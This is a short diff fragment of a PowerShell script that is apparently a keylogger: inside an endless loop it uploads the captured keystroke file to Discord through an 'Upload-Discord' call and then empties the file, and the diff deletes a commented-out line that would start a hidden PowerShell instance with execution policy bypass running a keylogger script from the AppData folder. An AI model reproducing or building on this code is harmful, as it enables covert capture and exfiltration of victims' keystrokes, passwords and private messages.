@@ -81,7 +81,7 @@ while ($true) {
             # runs keylogger
 			Upload-Discord -file $Path
             echo "" > $Path 
-            #powershell Start-Process powershell.exe -windowstyle hidden -ep bypass "$env:appdata/keys.ps1"
+            
 			
         }
     }
